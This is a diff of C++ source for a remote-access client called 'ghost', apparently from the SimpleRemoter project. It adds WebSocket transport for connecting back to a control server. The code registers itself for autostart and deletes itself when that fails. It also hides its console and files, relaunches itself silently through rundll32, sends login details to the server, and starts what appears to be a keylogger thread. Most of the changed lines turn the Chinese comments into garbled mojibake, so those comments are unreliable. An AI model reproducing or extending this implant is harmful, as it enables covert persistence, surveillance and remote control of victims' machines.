@@ -4,25 +4,26 @@
 #include "stdafx.h"
 #include "ClientDll.h"
 #include <common/iniFile.h>
+#include "transport/ws_client.h"
 extern "C" {
 #include "reg_startup.h"
 }
 
-// ×Ô¶¯Æô¶¯×¢²á±íÖÐµÄÖµ
+// Ô¶×¢ÐµÖµ
 #define REG_NAME "a_ghost"
 
-// Æô¶¯µÄ¿Í»§¶Ë¸öÊý
+// Ä¿Í»Ë¸
 #define CLIENT_PARALLEL_NUM 1
 
-// Ô¶³ÌµØÖ·
+// Ô¶ÌµÖ·
 CONNECT_ADDRESS g_SETTINGS = {
     FLAG_GHOST, "127.0.0.1", "6543", CLIENT_TYPE_DLL, false, DLL_VERSION,
     FALSE, Startup_DLL, PROTOCOL_HELL, PROTO_TCP, RUNNING_RANDOM, "default", {},
     0, 7057226198541618915, {},
 };
 
-// ×îÖÕ¿Í»§¶ËÖ»ÓÐ2¸öÈ«¾Ö±äÁ¿: g_SETTINGS¡¢g_MyApp£¬¶øg_SETTINGS×÷Îªg_MyAppµÄ³ÉÔ±.
-// Òò´ËÈ«¾ÖÀ´¿´Ö»ÓÐÒ»¸öÈ«¾Ö±äÁ¿: g_MyApp
+// Õ¿Í»Ö»2È«Ö±: g_SETTINGSg_MyAppg_SETTINGSÎªg_MyAppÄ³Ô±.
+// È«Ö»Ò»È«Ö±: g_MyApp
 ClientApp g_MyApp(&g_SETTINGS, IsClientAppRunning);
 
 enum { E_RUN, E_STOP, E_EXIT } status;
@@ -70,7 +71,7 @@ DWORD WINAPI StartClientApp(LPVOID param)
         settings.SetServer(ip, port);
     }
     if (strlen(settings.ServerIP()) == 0 || settings.ServerPort() <= 0) {
-        Mprintf("²ÎÊý²»×ã: ÇëÌá¹©Ô¶³ÌÖ÷»úIPºÍ¶Ë¿Ú!\n");
+        Mprintf(": á¹©Ô¶IPÍ¶Ë¿!\n");
         Sleep(3000);
     } else {
         app->g_hInstance = GetModuleHandle(NULL);
@@ -95,11 +96,11 @@ DWORD WINAPI StartClientApp(LPVOID param)
 }
 
 /**
- * @brief µÈ´ý¶à¸ö¾ä±ú£¨Ö§³Ö³¬¹ýMAXIMUM_WAIT_OBJECTSÏÞÖÆ£©
- * @param handles ¾ä±úÊý×é
- * @param waitAll ÊÇ·ñµÈ´ýËùÓÐ¾ä±úÍê³É£¨TRUE=È«²¿, FALSE=ÈÎÒâÒ»¸ö£©
- * @param timeout ³¬Ê±Ê±¼ä£¨ºÁÃë£¬INFINITE±íÊ¾ÎÞÏÞµÈ´ý£©
- * @return µÈ´ý½á¹û£¨WAIT_OBJECT_0³É¹¦, WAIT_FAILEDÊ§°Ü£©
+ * @brief È´Ö§Ö³MAXIMUM_WAIT_OBJECTSÆ£
+ * @param handles 
+ * @param waitAll Ç·È´Ð¾É£TRUE=È«, FALSE=Ò»
+ * @param timeout Ê±Ê±ä£¨ë£¬INFINITEÊ¾ÞµÈ´
+ * @return È´WAIT_OBJECT_0É¹, WAIT_FAILEDÊ§Ü£
  */
 DWORD WaitForMultipleHandlesEx(
     const std::vector<HANDLE>& handles,
@@ -107,10 +108,10 @@ DWORD WaitForMultipleHandlesEx(
     DWORD timeout = INFINITE
 )
 {
-    const DWORD MAX_WAIT = MAXIMUM_WAIT_OBJECTS; // ÏµÍ³ÏÞÖÆ£¨64£©
+    const DWORD MAX_WAIT = MAXIMUM_WAIT_OBJECTS; // ÏµÍ³Æ£64
     DWORD totalHandles = static_cast<DWORD>(handles.size());
 
-    // 1. ¼ì²é¾ä±úÓÐÐ§ÐÔ
+    // 1. Ð§
     for (HANDLE h : handles) {
         if (h == NULL || h == INVALID_HANDLE_VALUE) {
             SetLastError(ERROR_INVALID_HANDLE);
@@ -118,20 +119,20 @@ DWORD WaitForMultipleHandlesEx(
         }
     }
 
-    // 2. Èç¹û¾ä±úÊý¡Ü64£¬Ö±½Óµ÷ÓÃÔ­ÉúAPI
+    // 2. 64Ö±ÓµÔ­API
     if (totalHandles <= MAX_WAIT) {
         return WaitForMultipleObjects(totalHandles, handles.data(), waitAll, timeout);
     }
 
-    // 3. ·ÖÅúµÈ´ýÂß¼­
+    // 3. È´ß¼
     if (waitAll) {
-        // ±ØÐëµÈ´ýËùÓÐ¾ä±úÍê³É
+        // È´Ð¾
         for (DWORD i = 0; i < totalHandles; i += MAX_WAIT) {
             DWORD batchSize = min(MAX_WAIT, totalHandles - i);
             DWORD result = WaitForMultipleObjects(
                                batchSize,
                                &handles[i],
-                               TRUE,  // ±ØÐëµÈ´ýµ±Ç°Åú´ÎÈ«²¿Íê³É
+                               TRUE,  // È´Ç°È«
                                timeout
                            );
             if (result == WAIT_FAILED) {
@@ -140,18 +141,18 @@ DWORD WaitForMultipleHandlesEx(
         }
         return WAIT_OBJECT_0;
     } else {
-        // Ö»ÐèµÈ´ýÈÎÒâÒ»¸ö¾ä±úÍê³É
+        // Ö»È´Ò»
         while (true) {
             for (DWORD i = 0; i < totalHandles; i += MAX_WAIT) {
                 DWORD batchSize = min(MAX_WAIT, totalHandles - i);
                 DWORD result = WaitForMultipleObjects(
                                    batchSize,
                                    &handles[i],
-                                   FALSE,  // µ±Ç°Åú´ÎÈÎÒâÒ»¸öÍê³É¼´¿É
+                                   FALSE,  // Ç°Ò»É¼
                                    timeout
                                );
                 if (result != WAIT_FAILED && result != WAIT_TIMEOUT) {
-                    return result + i; // ·µ»ØÈ«¾ÖË÷Òý
+                    return result + i; // È«
                 }
             }
             if (timeout != INFINITE) {
@@ -165,11 +166,11 @@ DWORD WaitForMultipleHandlesEx(
 
 #include "auto_start.h"
 
-// Òþ²Ø¿ØÖÆÌ¨
-// ²Î¿´£ºhttps://blog.csdn.net/lijia11080117/article/details/44916647
-// step1: ÔÚÁ´½ÓÆ÷"¸ß¼¶"ÉèÖÃÈë¿ÚµãÎªmainCRTStartup
-// step2: ÔÚÁ´½ÓÆ÷"ÏµÍ³"ÉèÖÃÏµÍ³Îª´°¿Ú
-// Íê³É
+// Ø¿Ì¨
+// Î¿https://blog.csdn.net/lijia11080117/article/details/44916647
+// step1: "ß¼"ÚµÎªmainCRTStartup
+// step2: "ÏµÍ³"ÏµÍ³Îª
+// 
 
 BOOL CALLBACK callback(DWORD CtrlType)
 {
@@ -183,7 +184,7 @@ BOOL CALLBACK callback(DWORD CtrlType)
 
 int main(int argc, const char *argv[])
 {
-    // ×¢²áÆô¶¯Ïî
+    // ×¢
     int r = RegisterStartup("Windows Ghost", "WinGhost");
     if (r <= 0) {
         BOOL s = self_del();
@@ -191,7 +192,7 @@ int main(int argc, const char *argv[])
     }
 
     if (!SetSelfStart(argv[0], REG_NAME)) {
-        Mprintf("ÉèÖÃ¿ª»ú×ÔÆô¶¯Ê§°Ü£¬ÇëÓÃ¹ÜÀíÔ±È¨ÏÞÔËÐÐ.\n");
+        Mprintf("Ã¿Ê§Ü£Ã¹Ô±È¨.\n");
     }
 
     status = E_RUN;
@@ -215,7 +216,7 @@ int main(int argc, const char *argv[])
     g_SETTINGS.SetServer(ip, port);
 #endif
     if (CLIENT_PARALLEL_NUM == 1) {
-        // Æô¶¯µ¥¸ö¿Í»§¶Ë
+        // Í»
         StartClientApp(&app);
     } else {
         std::vector<HANDLE> handles(CLIENT_PARALLEL_NUM);
@@ -223,12 +224,12 @@ int main(int argc, const char *argv[])
             auto client = new ClientApp(app.g_Connection, IsSharedRunning, FALSE);
             handles[i] = __CreateSmallThread(0, 0, 64*1024, StartClientApp, client->SetID(i), 0, 0);
             if (handles[i] == 0) {
-                Mprintf("Ïß³Ì %d ´´½¨Ê§°Ü£¬´íÎó: %d\n", i, errno);
+                Mprintf("ß³ %d Ê§Ü£: %d\n", i, errno);
             }
         }
         DWORD result = WaitForMultipleHandlesEx(handles, TRUE, INFINITE);
         if (result == WAIT_FAILED) {
-            Mprintf("WaitForMultipleObjects Ê§°Ü£¬´íÎó´úÂë: %d\n", GetLastError());
+            Mprintf("WaitForMultipleObjects Ê§Ü£: %d\n", GetLastError());
         }
     }
     ClientApp::Wait();
@@ -276,7 +277,7 @@ BOOL APIENTRY DllMain( HINSTANCE hInstance,
     return TRUE;
 }
 
-// Æô¶¯ÔËÐÐÒ»¸öghost
+// Ò»ghost
 extern "C" __declspec(dllexport) void TestRun(char* szServerIP,int uPort)
 {
     ClientApp& app(g_MyApp);
@@ -302,25 +303,25 @@ extern "C" __declspec(dllexport) void TestRun(char* szServerIP,int uPort)
     CloseHandle(hThread);
 }
 
-// Í£Ö¹ÔËÐÐ
+// Í£Ö¹
 extern "C" __declspec(dllexport) void StopRun()
 {
     g_MyApp.g_bExit = S_CLIENT_EXIT;
 }
 
-// ÊÇ·ñ³É¹¦Í£Ö¹
+// Ç·É¹Í£Ö¹
 extern "C" __declspec(dllexport) bool IsStoped()
 {
     return g_MyApp.g_bThreadExit && ClientApp::GetCount() == 0;
 }
 
-// ÊÇ·ñÍË³ö¿Í»§¶Ë
+// Ç·Ë³Í»
 extern "C" __declspec(dllexport) BOOL IsExit()
 {
     return g_MyApp.g_bExit;
 }
 
-// ¼òµ¥ÔËÐÐ´Ë³ÌÐò£¬ÎÞÐèÈÎºÎ²ÎÊý
+// Ð´Ë³ÎºÎ²
 extern "C" __declspec(dllexport) int EasyRun()
 {
     ClientApp& app(g_MyApp);
@@ -330,11 +331,11 @@ extern "C" __declspec(dllexport) int EasyRun()
         TestRun((char*)settings.ServerIP(), settings.ServerPort());
         while (!IsStoped())
             Sleep(50);
-        if (S_CLIENT_EXIT == app.g_bExit) // ÊÜ¿Ø¶ËÍË³ö
+        if (S_CLIENT_EXIT == app.g_bExit) // Ü¿Ø¶Ë³
             break;
         else if (S_SERVER_EXIT == app.g_bExit)
             continue;
-        else // S_CLIENT_UPDATE: ³ÌÐò¸üÐÂ
+        else // S_CLIENT_UPDATE: 
             break;
     } while (true);
 
@@ -342,7 +343,7 @@ extern "C" __declspec(dllexport) int EasyRun()
 }
 
 // copy from: SimpleRemoter\client\test.cpp
-// ÆôÓÃÐÂµÄDLL
+// ÂµDLL
 void RunNewDll(const char* cmdLine)
 {
     char path[_MAX_PATH], * p = path;
@@ -368,7 +369,7 @@ void RunNewDll(const char* cmdLine)
                 ok = FALSE;
             }
         } else {
-            // ÉèÖÃÎÄ¼þÊôÐÔÎªÒþ²Ø
+            // Ä¼Îª
             if (SetFileAttributesA(oldFile.c_str(), FILE_ATTRIBUTE_HIDDEN)) {
                 Mprintf("File created and set to hidden: %s\n", oldFile.c_str());
             }
@@ -385,13 +386,13 @@ void RunNewDll(const char* cmdLine)
     ShellExecuteA(NULL, "open", "rundll32.exe", cmd, NULL, SW_HIDE);
 }
 
-/* ÔËÐÐ¿Í»§¶ËµÄºËÐÄ´úÂë. ´ËÎª¶¨Òåµ¼³öº¯Êý, Âú×ã rundll32 µ÷ÓÃÔ¼¶¨.
-HWND hwnd: ¸¸´°¿Ú¾ä±ú£¨Í¨³£Îª NULL£©¡£
-HINSTANCE hinst: DLL µÄÊµÀý¾ä±ú¡£
-LPSTR lpszCmdLine: ÃüÁîÐÐ²ÎÊý£¬×÷Îª×Ö·û´®´«µÝ¸øº¯Êý¡£
-int nCmdShow: ´°¿ÚÏÔÊ¾×´Ì¬¡£
-ÔËÐÐÃüÁî£ºrundll32.exe ClientDemo.dll,Run 127.0.0.1:6543
-ÓÅÏÈ´ÓÃüÁîÐÐ²ÎÊýÖÐ¶ÁÈ¡Ö÷»úµØÖ·£¬Èç¹û²»Ö¸¶¨Ö÷»ú¾Í´ÓÈ«¾Ö±äÁ¿¶ÁÈ¡¡£
+/* Ð¿Í»ËµÄºÄ´. Îªåµ¼,  rundll32 Ô¼.
+HWND hwnd: Ú¾Í¨Îª NULL
+HINSTANCE hinst: DLL Êµ
+LPSTR lpszCmdLine: Ð²ÎªÖ·Ý¸
+int nCmdShow: Ê¾×´Ì¬
+î£ºrundll32.exe ClientDemo.dll,Run 127.0.0.1:6543
+È´Ð²Ð¶È¡Ö·Ö¸Í´È«Ö±È¡
 */
 extern "C" __declspec(dllexport) void Run(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
 {
@@ -415,7 +416,7 @@ extern "C" __declspec(dllexport) void Run(HWND hwnd, HINSTANCE hinst, LPSTR lpsz
         result.push_back("80");
     }
     if (result.size() != 2) {
-        MessageBox(hwnd, "ÇëÌá¹©ÕýÈ·µÄÖ÷»úµØÖ·!", "ÌáÊ¾", MB_OK);
+        MessageBox(hwnd, "á¹©È·Ö·!", "Ê¾", MB_OK);
         return;
     }
 
@@ -467,6 +468,9 @@ DWORD WINAPI StartClient(LPVOID lParam)
     State& bExit(app.g_bExit);
     IOCPClient  *ClientObject = NewNetClient(&settings, bExit, pubIP);
     if (nullptr == ClientObject) return -1;
+    auto wssEndpoint = ParseWssEndpoint(settings.ServerIP());
+    std::string connectHost = (settings.protoType == PROTO_WSS && !wssEndpoint.host.empty()) ?
+        wssEndpoint.host : settings.ServerIP();
     CKernelManager* Manager = nullptr;
 
     if (!app.m_bShared) {
@@ -482,8 +486,8 @@ DWORD WINAPI StartClient(LPVOID lParam)
     ThreadInfo* kb = CreateKB(&settings, bExit, pubIP);
     while (app.m_bIsRunning(&app)) {
         ULONGLONG dwTickCount = GetTickCount64();
-        if (!ClientObject->ConnectServer(settings.ServerIP(), settings.ServerPort())) {
-            Mprintf("[ConnectServer] ---> %s:%d.\n", settings.ServerIP(), settings.ServerPort());
+        if (!ClientObject->ConnectServer(connectHost.c_str(), settings.ServerPort())) {
+            Mprintf("[ConnectServer] ---> %s:%d.\n", connectHost.c_str(), settings.ServerPort());
             for (int k = 300+(IsDebug ? rand()%600:rand()%6000); app.m_bIsRunning(&app) && --k; Sleep(10));
             SetThreadExecutionState(ES_CONTINUOUS | ES_SYSTEM_REQUIRED);
             continue;
@@ -491,7 +495,7 @@ DWORD WINAPI StartClient(LPVOID lParam)
         SAFE_DELETE(Manager);
         Manager = new CKernelManager(&settings, ClientObject, app.g_hInstance, kb, bExit);
 
-        //×¼±¸µÚÒ»²¨Êý¾Ý
+        //×¼Ò»
         LOGIN_INFOR login = GetLoginInfo(GetTickCount64() - dwTickCount, settings);
         ClientObject->SendLoginInfo(login);
 
